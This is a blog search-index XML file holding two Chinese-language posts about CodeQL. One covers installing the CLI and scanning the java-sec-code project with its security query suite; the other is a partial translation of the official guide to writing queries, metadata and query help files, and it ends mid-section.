<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CodeQL1-了解CodeQL</title>
    <url>/CodeQL1-%E4%BA%86%E8%A7%A3CodeQL/</url>
    <content><![CDATA[<blockquote>
<p>知其白，守其黑，为天下式。</p>
</blockquote>
<p>CodeQL入门学习</p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>QL是一种查询语言，支持对C++，C#，Java，JavaScript，Python，go等多种语言进行分析，可用于分析代码，查找代码中控制流等信息。</p>
<p>CodeQL 的整体思路是把源代码转化成一个可查询的数据库，通过 Extractor 模块对源代码工程进行关键信息分析提取，构成一个关系型数据库。CodeQL 的数据库并没有使用现有的数据库技术，而是一套自己实现的文件系统数据库。</p>
<p>对于编译型语言，Extractor 会监控编译过程，编译器每处理一个源代码文件，它都会收集源代码的相关信息，如：语法信息（AST 抽象语法树）、语意信息（名称绑定、类型信息、运算操作等），控制流、数据流等，同时也会复制一份源代码文件。而对于解释性语言，Extractor 则直接分析源代码，得到类似的相关信息。</p>
<p>关键信息提取完成后，所有分析所需的数据都会导入一个文件夹，这个就是 CodeQL database, 其中包括了源代码文件、关系数据、语言相关的 database schema（schema 定义了数据之间的相互关系）。</p>
<p><img src="../images/pic/codeql1.png"></p>
<p>CodeQL 自己定义实现了一套名为 QL 的查询语言，并提供了相应的支持库和运行环境。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>分析程序支持主流的操作系统,Windows,Mac,Linux</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir codeql-home</span><br><span class="line">cd codeql-home</span><br><span class="line">mkdir codeql-cli</span><br><span class="line">cd codeql-cli</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://github.com/github/codeql-cli-binaries</span></span><br><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/github/</span>codeql-cli-binaries<span class="regexp">/releases/</span>download<span class="regexp">/v2.9.3/</span>codeql-linux64.zip</span><br></pre></td></tr></table></figure>

<p>解压之后添加到环境变量</p>
<p>然后下载lib</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换到codeql-home</span></span><br><span class="line">mkdir codeql-lib</span><br><span class="line">cd codeql-lib</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/github/</span>codeql.git</span><br></pre></td></tr></table></figure>

<p><strong>下载vscode扩展</strong></p>
<img src="../images/pic/codeql.jpg" style="zoom:50%;" /> 

<p>修改同时扫描的最大查询规则数量</p>
<img src="../images/pic/codeql2.jpg" style="zoom:50%;" /> 

<img src="../images/pic/codeql3.jpg" style="zoom:50%;" /> 



<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>以java-sec-code为例</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS query]$ git clone htt<span class="symbol">ps:</span>//github.com/JoyChou93/java-<span class="built_in">sec</span>-code.git</span><br><span class="line">[shadowflow@ShadowOS query]$ cd java-<span class="built_in">sec</span>-<span class="built_in">code</span></span><br><span class="line">[shadowflow@ShadowOS java-<span class="built_in">sec</span>-<span class="built_in">code</span>]$ mkdir java-<span class="built_in">sec</span>-<span class="built_in">code</span>-qldb</span><br><span class="line">[shadowflow@ShadowOS java-<span class="built_in">sec</span>-<span class="built_in">code</span>]$ codeql database create java-<span class="built_in">sec</span>-<span class="built_in">code</span>-qldb -l java --command=<span class="string">&quot;mvn clean install -Dmaven.test.skip=true&quot;</span> --overwrite</span><br></pre></td></tr></table></figure>

<p>打开codeql扩展，添加生成的db</p>
<img src="../images/pic/codeql4.jpg" style="zoom:50%;" /> 

<p>选择如下目录，使用所有的java漏洞规则进行扫描</p>
<blockquote>
<ul>
<li>codeql-lib<ul>
<li>java<ul>
<li>ql<ul>
<li>src<ul>
<li>security</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<img src="../images/pic/codeql5.jpg" style="zoom: 67%;" /> 

<p>扫描完成我们可以查看结果，并且选择其他目录里的规则进行扫描。</p>
]]></content>
      <categories>
        <category>代码安全</category>
      </categories>
      <tags>
        <tag>代码安全</tag>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL2-编写查询</title>
    <url>/CodeQL2-%E7%BC%96%E5%86%99%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p><font style="color:Gray; float:left">南有乔木，不可休思；汉有游女，不可求思。</font><br></p>
<p><font style="color:Gray; float:right">——《诗经.汉广》</font></p>
<br>

<p>编写CodeQL查询语句，参考官网文档进行翻译。</p>
<span id="more"></span>





<h2 id="1-关于CodeQL查询"><a href="#1-关于CodeQL查询" class="headerlink" title="1. 关于CodeQL查询"></a>1. 关于CodeQL查询</h2><p>CodeQL查询用于分析与安全性、正确性、可维护性和可读性相关的代码问题。</p>
<h3 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h3><p>CodeQL自带的查询语句已经包含了用于查询支持的语言的最重要最有趣的问题。但是，你还是可以自己编写查询语句用来查询自己项目中你关心的问题。CodeQL的查询语句类型如下：</p>
<ul>
<li><code>Alert queries</code>: 查询你代码中明显的代码问题。</li>
<li><code>Path queries</code>:  用于查询source和sink点之前的数据流信息。</li>
</ul>
<p>可以将自己编写的CodeQL查询添加到<code>QL packs</code>，然后使用<a href="https://docs.github.com/en/code-security/secure-coding/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning">Code scanning</a>扫描，或者CodeQL CLI扫描或者添加到CodeQL查询的开源github仓库。</p>
<p>这一节主要是基础知识，更多CodeQL查询相关的内容需要与编程语言结合，官方文档在<a href="https://codeql.github.com/docs/codeql-language-guides/#codeql-language-guides">CodeQL language guides</a>。关于QL语言的更详细的介绍在<a href="https://codeql.github.com/docs/ql-language-reference/#ql-language-reference">QL language reference</a>。如果想将自己编写的查询语句贡献给CodeQL查询github仓库，需要遵循一定的规范，相关内容在 <a href="https://github.com/github/codeql/blob/main/docs/ql-style-guide.md">CodeQL style guide</a>。</p>
<h3 id="1-2-基本查询结构"><a href="#1-2-基本查询结构" class="headerlink" title="1.2 基本查询结构"></a>1.2 基本查询结构</h3><p>CodeQL查询文件的扩展名是.ql，查询代码需要包含select语句。</p>
<p>现有的查询代码都有如下结构</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * Query metadata </span><br><span class="line"> * 查询元数据</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import <span class="regexp">/* ... CodeQL libraries or modules CodeQL的库或者模块... */</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/* ... Optional, define CodeQL classes and predicates 可选内容, 定义CodeQL类和谓词 ... */</span></span><br><span class="line"></span><br><span class="line">from <span class="regexp">/* ... variable declarations 变量声明 ... */</span></span><br><span class="line">where <span class="regexp">/* ... logical formula 逻辑公司... */</span></span><br><span class="line">select <span class="regexp">/* ... expressions 表达式... */</span></span><br></pre></td></tr></table></figure>

<p>接下来的几个部分以<code>Alert queries</code>为例，讲一讲上述结构的具体内容。<code>Path queries</code>的内容会在后门介绍。</p>
<p><strong>Query metadata</strong></p>
<p>Query metadata（查询元数据）。</p>
<p>当自己编写的查询文件添加到github仓库或者用于自己分析的时候，需要<code>Query metadata</code>来确认相关信息。<code>Query metadata</code>包含查询的目的，以及包含如何解释和显示查询结果。</p>
<p>元数据内容取决于你怎样运行你的查询。</p>
<ul>
<li>如果是贡献给GitHub仓库，阅读 <a href="https://github.com/github/codeql/blob/main/docs/query-metadata-style-guide.md">query metadata style guide</a></li>
<li>如果是添加到LGTM 的查询包里面，阅读<a href="https://lgtm.com/help/lgtm/writing-custom-queries">Writing custom queries to include in LGTM analysis</a></li>
<li>如果使用CodeQL CLI，元数据必须包含 <code>@kind</code>字段</li>
<li>如果在LGTM的console或者VS Code扩展运行，metadata是不强制编写的。然而，如果想你的查询结果是<code>Alert queries</code>或者<code>Path queries</code>类型，必须要有 <code>@kind</code>字段。更多信息，LGTM.com参考 <a href="https://lgtm.com/help/lgtm/using-query-console">Using the query console</a> ，使用VS Code扩展参考<a href="https://codeql.github.com/docs/codeql-for-visual-studio-code/analyzing-your-projects/#analyzing-your-projects">Analyzing your projects</a>。</li>
</ul>
<blockquote>
<p>不管是将查询代码添加到开源仓库，或者添加到LGTM的pack里面，还是使用CodeQL CLi都必须有@kind字段，@kind指明怎样解释和显示查询结果</p>
<ul>
<li>Alert query metadat 必须包含 <code>@kind problem</code>来确保结果是 simple alert</li>
<li>Path query metadata 必须包含 <code>@kind path-problem</code> 来确保结果是代码传播过程</li>
<li>Diagnostic query metadata 必须包含  <code>@kind diagnostic</code> 来确保结果是故障排除</li>
<li>Summary query metadata 必须包含  <code>@kind metric</code>和 <code>@tags summary</code> 来确保结果是CodeQL数据库的概览指标</li>
</ul>
</blockquote>
<p><strong>Import 语句</strong></p>
<p>每一个查询代码通常会包含一个或者更多<code>import</code>语句，用来定义导入什么库或者模块。库和模块将一组相关的<code>type</code>、<code>predicates</code>已经其他模块组织在一起。然后查询就可以访问每一个导入的库和模块。 <a href="https://github.com/github/codeql">open source repository on GitHub</a>包含了支持的每一种语言的标准库。</p>
<p>当编写<code>alert queries</code>的时候，通常会导入项目使用的编程语言的标准库。<code>import</code>后跟如下语言</p>
<ul>
<li>C/C++: <code>cpp</code></li>
<li>C#: <code>csharp</code></li>
<li>Go: <code>go</code></li>
<li>Java: <code>java</code></li>
<li>JavaScript/TypeScript: <code>javascript</code></li>
<li>Python: <code>python</code></li>
</ul>
<p>还有一些库包含常用的<code>predicates</code>,<code>types</code>,和其他与分析相关的模块，包括<code>data flow</code>, <code>control flow</code>,和 <code>taint-tracking</code></p>
<p><strong>可选的CodeQL class和predicates</strong></p>
<p>可以在查询中编写自己的class和predicates，更多详细类容 <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#defining-a-predicate">Defining a predicate</a> 和 <a href="https://codeql.github.com/docs/ql-language-reference/types/#defining-a-class">Defining a class</a></p>
<p><strong>From子句</strong></p>
<p><code>from</code>子句声明查询中要使用的变量，每个声明按照格式：<type> <variable name>，更多内容参考QL语言部分。</p>
<p><strong>Where子句</strong></p>
<p><code>where</code>子句定义逻辑条件。</p>
<p><strong>Select子句</strong></p>
<p><code>select</code>子句用于显示复合<code>where</code>子句条件的<code>from</code>子句声明的变量。显示的结构由@kind决定。</p>
<p>如果是<code>@kind problem</code>,由两个字段组成：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">element</span>, <span class="keyword">string</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>element</code>: 由查询确定，它就是要查询的内容</li>
<li><code>string</code>: 一条消息，也可以包含链接和占位符，起解释作用</li>
</ul>
<p>其他@kind类型在后面将讲到。</p>
<h2 id="2-Metadata"><a href="#2-Metadata" class="headerlink" title="2. Metadata"></a>2. Metadata</h2><p>Metadata(元数据)告诉用户的重要信息。你必须编写正确的查询元数据来获取结果。</p>
<h3 id="2-1-关于查询元数据"><a href="#2-1-关于查询元数据" class="headerlink" title="2.1 关于查询元数据"></a>2.1 关于查询元数据</h3><p>Metadata作为QLDodc注释出现在查询文件的顶部。metadata用于定义查询方式、显示方式，以及方便其他用户了解此查询文件的解释。</p>
<h3 id="2-2-Metadata属性"><a href="#2-2-Metadata属性" class="headerlink" title="2.2 Metadata属性"></a>2.2 Metadata属性</h3><p>下面的属性支持所有的查询文件</p>
<table>
<thead>
<tr>
<th align="left">Property</th>
<th align="left">Value</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>@description</code></td>
<td align="left"><code>&lt;text&gt;</code></td>
<td align="left">一条语句或一个段落，用来描述查询的目的和结果的有效性和重要性。用<code>&#39;&#39;</code>包含</td>
</tr>
<tr>
<td align="left"><code>@id</code></td>
<td align="left"><code>&lt;text&gt;</code></td>
<td align="left">由小写字母或数字组成的一系列单词，用<code>/</code>或<code>-</code>分割，识别和分类查询，每一个查询必须有唯一的ID。为了确保唯一ID，使用固定结构也许有帮助，比如LGTM的标准查询的格式： <code>&lt;language&gt;/&lt;brief-description&gt;</code></td>
</tr>
<tr>
<td align="left"><code>@kind</code></td>
<td align="left"><code>problem</code><br><code>path-problem</code></td>
<td align="left">确实查询是alert (<code>@kind problem</code>) 或者 path (<code>@kind path-problem</code>)。</td>
</tr>
<tr>
<td align="left"><code>@name</code></td>
<td align="left"><code>&lt;text&gt;</code></td>
<td align="left">定义查询标签的语句。用<code>&#39;&#39;</code>包含</td>
</tr>
<tr>
<td align="left"><code>@tags</code></td>
<td align="left"><code>correctness</code><br><code>maintainability</code><br><code>readability</code><br><code>security</code></td>
<td align="left">这些标签将查询按大的类别分组，以便于搜索和识别它们。除了列出的常见标签，还有一些更具体的类别。参考<a href="https://github.com/github/codeql/blob/main/docs/query-metadata-style-guide.md">Query metadata style guide</a>.</td>
</tr>
<tr>
<td align="left"><code>@precision</code></td>
<td align="left"><code>low</code><br><code>medium</code><br><code>high</code><br><code>very-high</code></td>
<td align="left">指示查询结果为正的百分比。这一点，和@problem.severity特性，决定是否在LGTM上默认显示</td>
</tr>
<tr>
<td align="left"><code>@problem.severity</code></td>
<td align="left"><code>error</code><br><code>warning</code><br><code>recommendation</code></td>
<td align="left">定义非安全查询的告警程度。和 <code>@precision</code>一起，决定是否显示结果</td>
</tr>
<tr>
<td align="left"><code>@security-severity</code></td>
<td align="left"><code>&lt;score&gt;</code></td>
<td align="left">定义紧急程度，在0.0和10.0之间</td>
</tr>
</tbody></table>
<h3 id="2-3-filter查询的其他属性"><a href="#2-3-filter查询的其他属性" class="headerlink" title="2.3 filter查询的其他属性"></a>2.3 filter查询的其他属性</h3><p>过滤器查询用于定义其他约束，以限制其他查询返回的结果。一个过滤器查询必须有一样的@kind属性，用来指定结果的过滤。不需要其他元数据属性。</p>
<h3 id="2-4-用例"><a href="#2-4-用例" class="headerlink" title="2.4 用例"></a>2.4 用例</h3><p>标准的java查询元数据</p>
<p><img src="https://codeql.github.com/docs/_images/query-metadata.png"></p>
<h2 id="3-查询帮助文件"><a href="#3-查询帮助文件" class="headerlink" title="3. 查询帮助文件"></a>3. 查询帮助文件</h2><p>Query help files（查询帮助文件）告诉用户查询的目的，并建议如何解决查询发现的潜在问题。</p>
<p>这个部分关于查询帮助文件结构的详细信息。关于如何写一个好的查询帮助文件参考 <a href="https://github.com/github/codeql/blob/main/docs/query-help-style-guide.md">Query help style guide</a></p>
<h3 id="3-1-概览"><a href="#3-1-概览" class="headerlink" title="3.1 概览"></a>3.1 概览</h3><p>每个查询帮助文件提供了关于使用一个查询的目的和使用的详细信息。当你编写你自己的查询的时候，我们也建议你也编写一个查询帮助文件以让其他使用者知道这个查询是做什么的已经怎么做的。</p>
<h3 id="3-2-结构"><a href="#3-2-结构" class="headerlink" title="3.2 结构"></a>3.2 结构</h3><p>查询帮助文档使用自定义的XML格式，存储文件是.qhelp扩展名。查询帮助文件的名字必须根查询文件名称一样，并且在同一目录。基本结果如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">qhelp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;qhelp.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">qhelp</span>&gt;</span></span><br><span class="line">    CONTAINS one or more section-level elements</span><br><span class="line"><span class="tag">&lt;/<span class="name">qhelp</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>头和顶级元素是必须要有的，</p>
<h3 id="3-3-Section-level-elements"><a href="#3-3-Section-level-elements" class="headerlink" title="3.3 Section-level elements"></a>3.3 Section-level elements</h3><p>Section-level 元素被用于在帮助文件中将信息组织成不同的部分。许多sections有heading，被 <code>title</code>属性或者默认值定义。下面的的section-level 元素可以在child 元素中使用。</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Attributes</th>
<th align="left">Children</th>
<th align="left">Purpose of section</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>example</code></td>
<td align="left">None</td>
<td align="left">Any block element</td>
<td align="left">编写一个用例，并且给出修复方案。默认</td>
</tr>
<tr>
<td align="left"><code>fragment</code></td>
<td align="left">None</td>
<td align="left">Any block element</td>
<td align="left">参考 “<a href="https://codeql.github.com/docs/writing-codeql-queries/query-help-files/#qhelp-inclusion">Query help inclusion</a>” below.</td>
</tr>
<tr>
<td align="left"><code>hr</code></td>
<td align="left">None</td>
<td align="left">None</td>
<td align="left">A horizontal rule. No heading.</td>
</tr>
<tr>
<td align="left"><code>include</code></td>
<td align="left"><code>src</code> The query help file to include.</td>
<td align="left">None</td>
<td align="left">Include a query help file at the location of this element. See “<a href="https://codeql.github.com/docs/writing-codeql-queries/query-help-files/#qhelp-inclusion">Query help inclusion</a>” below.</td>
</tr>
<tr>
<td align="left"><code>overview</code></td>
<td align="left">None</td>
<td align="left">Any block element</td>
<td align="left">查询目的概述。通常这是查询文档的第一部分。</td>
</tr>
<tr>
<td align="left"><code>recommendation</code></td>
<td align="left">None</td>
<td align="left">Any block element</td>
<td align="left">建议如何处理此查询识别的告警。默认标签.</td>
</tr>
<tr>
<td align="left"><code>references</code></td>
<td align="left">None</td>
<td align="left"><code>li</code> elements</td>
<td align="left">参考列表，一般在文档最后。默认标签</td>
</tr>
<tr>
<td align="left"><code>section</code></td>
<td align="left"><code>title</code> Title of the section</td>
<td align="left">Any block element</td>
<td align="left">General-purpose section with a heading defined by the <code>title</code> attribute。</td>
</tr>
<tr>
<td align="left"><code>semmleNotes</code></td>
<td align="left">None</td>
<td align="left">Any block element</td>
<td align="left">Implementation notes about the query. This section is used only for queries that implement a rule defined by a third party. Default heading.关于查询的实现说明</td>
</tr>
</tbody></table>
<h3 id="3-4-块元素"><a href="#3-4-块元素" class="headerlink" title="3.4 块元素"></a>3.4 块元素</h3><p>下面的元素是 <code>section</code>, <code>example</code>, <code>fragment</code>, <code>recommendation</code>, <code>overview</code>, and <code>semmleNotes</code> 的子元素</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Attributes</th>
<th align="left">Children</th>
<th align="left">Purpose of block</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>blockquote</code></td>
<td align="left">None</td>
<td align="left">Any block element</td>
<td align="left">显示引用的段落</td>
</tr>
<tr>
<td align="left"><code>img</code></td>
<td align="left"><code>src</code> The image file to include.<code>alt</code> Text for the image’s alt text.<code>height</code> Optional, height of the image.<code>width</code> Optional, the width of the image.</td>
<td align="left">None</td>
<td align="left">显示图像。图像的内容位于单独的图像文件中。</td>
</tr>
<tr>
<td align="left"><code>include</code></td>
<td align="left"><code>src</code> The query help file to include.</td>
<td align="left">None</td>
<td align="left">Include a query help file at the location of this element. See <a href="https://codeql.github.com/docs/writing-codeql-queries/query-help-files/#qhelp-inclusion">Query help inclusion</a> below for more information.</td>
</tr>
<tr>
<td align="left"><code>ol</code></td>
<td align="left">None</td>
<td align="left"><code>li</code></td>
<td align="left">显示有序列表。请参见下面的列表元素。</td>
</tr>
<tr>
<td align="left"><code>p</code></td>
<td align="left">None</td>
<td align="left">Any inline content</td>
<td align="left">显示段落，如在HTML文件中使用。</td>
</tr>
<tr>
<td align="left"><code>pre</code></td>
<td align="left">None</td>
<td align="left">Text</td>
<td align="left">等距字体显示文本</td>
</tr>
<tr>
<td align="left"><code>sample</code></td>
<td align="left"><code>language</code> The language of the in-line code sample.<code>src</code> Optional, the file containing the sample code.</td>
<td align="left">Text</td>
<td align="left">当指定了src文件，则根据文件扩展名推断语言，如果没有src文件，必须用sample标签声明</td>
</tr>
<tr>
<td align="left"><code>table</code></td>
<td align="left">None</td>
<td align="left"><code>tbody</code></td>
<td align="left">显示列表</td>
</tr>
<tr>
<td align="left"><code>ul</code></td>
<td align="left">None</td>
<td align="left"><code>li</code></td>
<td align="left">显示无序列表</td>
</tr>
<tr>
<td align="left"><code>warning</code></td>
<td align="left">None</td>
<td align="left">Text</td>
<td align="left">显示明显的告警，用于在较低准确度的查询，这样的查询一般默认禁用</td>
</tr>
</tbody></table>
<h3 id="3-5-List-元素"><a href="#3-5-List-元素" class="headerlink" title="3.5 List 元素"></a>3.5 List 元素</h3><p>查询帮助文件支持两种列表元素：: <code>ul</code> 和 <code>ol</code>。两个块元素都只支持<code>li</code>的子元素。每个<code>li</code>元素包含内联元素和块元素。</p>
<h3 id="3-6-表元素"><a href="#3-6-表元素" class="headerlink" title="3.6 表元素"></a>3.6 表元素</h3><p> <code>table</code> 用于在查询帮助文件中生成一个表。</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Attributes</th>
<th align="left">Children</th>
<th align="left">Purpose</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>tbody</code></td>
<td align="left">None</td>
<td align="left"><code>tr</code></td>
<td align="left">Defines the top-level element of a table.</td>
</tr>
<tr>
<td align="left"><code>tr</code></td>
<td align="left">None</td>
<td align="left"><code>th``td</code></td>
<td align="left">Defines one row of a table.</td>
</tr>
<tr>
<td align="left"><code>td</code></td>
<td align="left">None</td>
<td align="left">Any inline content</td>
<td align="left">Defines one cell of a table row.</td>
</tr>
<tr>
<td align="left"><code>th</code></td>
<td align="left">None</td>
<td align="left">Any inline content</td>
<td align="left">Defines one header cell of a table row.</td>
</tr>
</tbody></table>
<h3 id="3-7-内联内容"><a href="#3-7-内联内容" class="headerlink" title="3.7 内联内容"></a>3.7 内联内容</h3><table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Attributes</th>
<th align="left">Children</th>
<th align="left">Purpose</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>a</code></td>
<td align="left"><code>href</code> The URL of the link.</td>
<td align="left">text</td>
<td align="left">Defines hyperlink. When a user selects the child text, they will be redirected to the given URL.</td>
</tr>
<tr>
<td align="left"><code>b</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be displayed as bold face.</td>
</tr>
<tr>
<td align="left"><code>code</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content representing code. It is typically shown in a monospace font.</td>
</tr>
<tr>
<td align="left"><code>em</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be emphasized, typically by italicizing it.</td>
</tr>
<tr>
<td align="left"><code>i</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be displayed as italics.</td>
</tr>
<tr>
<td align="left"><code>img</code></td>
<td align="left"><code>src``alt``height``width</code></td>
<td align="left">None</td>
<td align="left">Display an image. See the description above in Block elements.</td>
</tr>
<tr>
<td align="left"><code>strong</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be rendered more strongly, typically using bold face.</td>
</tr>
<tr>
<td align="left"><code>sub</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be rendered as subscript.</td>
</tr>
<tr>
<td align="left"><code>sup</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be rendered as superscript.</td>
</tr>
<tr>
<td align="left"><code>tt</code></td>
<td align="left">None</td>
<td align="left">Inline content</td>
<td align="left">Defines content that should be displayed with a monospace font.</td>
</tr>
</tbody></table>
<h3 id="3-8-包含"><a href="#3-8-包含" class="headerlink" title="3.8 包含"></a>3.8 包含</h3><p>为了在不同的帮助主题中使用重复的内容，可以将都用的内容存在查询帮助文件，其他文件帮助文件就可以使用<code>include</code>标签来引用。共享内容可以放在同一个目录或者放在 <code>SEMMLE_DIST/docs/include</code>。如果一个查询帮助文件只是被引用但不属于其他文件，需要使用<code>.inc.qhelp</code>后缀</p>
<p> <code>include</code> 元素可以被用于Section-level 元素或者块元素。</p>
<p><strong>Section-level 包含元素</strong></p>
<p>Section-level 的<code>include</code>元素可以在<code>qhelp</code>中，例如</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">qhelp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">src</span>=<span class="string">&quot;XSS.qhelp&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">qhelp</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>Block-level 包含元素</strong></p>
<p>Block-level <code>include</code> 元素可以在section-level 元素里使用。例如，在<code>overview</code>中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">qhelp&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">overview</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">src</span>=<span class="string">&quot;ThreadUnsafeICryptoTransformOverview.inc.qhelp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">overview</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">qhelp</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="4-控制查询结果"><a href="#4-控制查询结果" class="headerlink" title="4. 控制查询结果"></a>4. 控制查询结果</h2><p>可以通过select语句控制显示结果</p>
<h3 id="4-1-关于查询结果"><a href="#4-1-关于查询结果" class="headerlink" title="4.1 关于查询结果"></a>4.1 关于查询结果</h3><p>结果里的信息由<code>select</code>语句控制，<code>select</code>语句必须有两个字段</p>
<ul>
<li>Element——告警的变量，也就是要查询的代码</li>
<li>String——自定义字符串消息</li>
</ul>
<p>在有些查询中，我们可以看见除上面外的其他内容，使用 <code>$@</code> 做占位符。如下</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">select access, <span class="string">&quot;Variable $@ may be null here &quot;</span> + msg + <span class="string">&quot;.&quot;</span>, <span class="selector-tag">var</span><span class="selector-class">.getVariable</span>(),</span><br><span class="line">  <span class="selector-tag">var</span><span class="selector-class">.getVariable</span>()<span class="selector-class">.getName</span>(), reason, <span class="string">&quot;this&quot;</span></span><br></pre></td></tr></table></figure>

<p>后门的内容都会放在 <code>$@</code> 的位置。</p>
<h3 id="4-2-编写select语句案例"><a href="#4-2-编写select语句案例" class="headerlink" title="4.2 编写select语句案例"></a>4.2 编写select语句案例</h3><p><code>CodeDuplication.qll</code>是比较文件相似度的库。我们将在案例中使用这个库来辨析示例。</p>
<p><strong>基本的select语句</strong></p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">external</span>.CodeDuplication</span><br><span class="line"></span><br><span class="line">from <span class="keyword">File</span> f, <span class="keyword">File</span> other, <span class="built_in">int</span> percent</span><br><span class="line"><span class="keyword">where</span> similarFiles(f, other, percent)</span><br><span class="line"><span class="keyword">select</span> f, <span class="string">&quot;This file is similar to another file.&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个基本查询语句的select语句有两个部分，</p>
<ul>
<li><code>f</code>对应要对比的文件</li>
<li>“This file is similar to another file.”是字符串消息。</li>
</ul>
<p><strong>在查询语句中显示其他文件信息</strong></p>
<p>上面的案例没有与其相似的文件信息，下面我们要打印出其他文件信息。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> f, <span class="string">&quot;This file is similar to &quot;</span> + other.getBaseName()</span><br></pre></td></tr></table></figure>

<p>这条语句可以将其他文件打印出来</p>
<p><strong>加入占位符</strong></p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">select f, <span class="string">&quot;This file is similar to $@.&quot;</span>, <span class="literal">other</span>, <span class="literal">other</span>.getBaseName()</span><br></pre></td></tr></table></figure>

<p>显示的时候other<code>, </code>other.getBaseName()<code>会替换</code>$@`的位置。</p>
<p>如果有多个占位符，原文如下，这里不深究</p>
<blockquote>
<p>If you use the <code>$@</code> placeholder marker multiple times in the description text, then the <code>N</code>th use is replaced by a link formed from columns <code>2N+2</code> and <code>2N+3</code>. If there are more pairs of additional columns than there are placeholder markers, then the trailing columns are ignored. Conversely, if there are fewer pairs of additional columns than there are placeholder markers, then the trailing markers are treated as normal text rather than placeholder markers.</p>
</blockquote>
<p><strong>加入相似度信息</strong></p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">select f, percent + <span class="string">&quot;% of the lines in &quot;</span> + f.getBaseName() + <span class="string">&quot; are similar to lines in $@.&quot;</span>, <span class="literal">other</span>, <span class="literal">other</span>.getBaseName()</span><br></pre></td></tr></table></figure>



<h2 id="5-元素位置信息"><a href="#5-元素位置信息" class="headerlink" title="5. 元素位置信息"></a>5. 元素位置信息</h2><p>CodeQL提供了在代码数据库里获取元素位置信息的机制。使用这个机制可以为用户提供更多的信息。</p>
<h3 id="5-1-关于元素位置"><a href="#5-1-关于元素位置" class="headerlink" title="5.1 关于元素位置"></a>5.1 关于元素位置</h3><p>当显示给用户信息的时候，LGTM需要能够从查询结果中提取位置信息，为此，所有的QL 类提供位置信息需要使用如下机制之一</p>
<ul>
<li>提供URLS</li>
<li>提供位置信息</li>
<li>使用提取的位置信息</li>
</ul>
<p>上诉按优先级排列，以便使用第一个可用的机制。</p>
<blockquote>
<p>因为QL是一种关系型语言，每一个QL类的实例都精确的映射到一个位置。这是库设计者的责任。如果实例没有位置信息，就不能点击结果跳转到源代码。如果有多个位置，结果就会重复。</p>
</blockquote>
<h3 id="5-2-提供URLS"><a href="#5-2-提供URLS" class="headerlink" title="5.2 提供URLS"></a>5.2 提供URLS</h3><p>一个自定义的URL可以写在一个没有参数的(注意大小写)的谓词getURL里，如下</p>
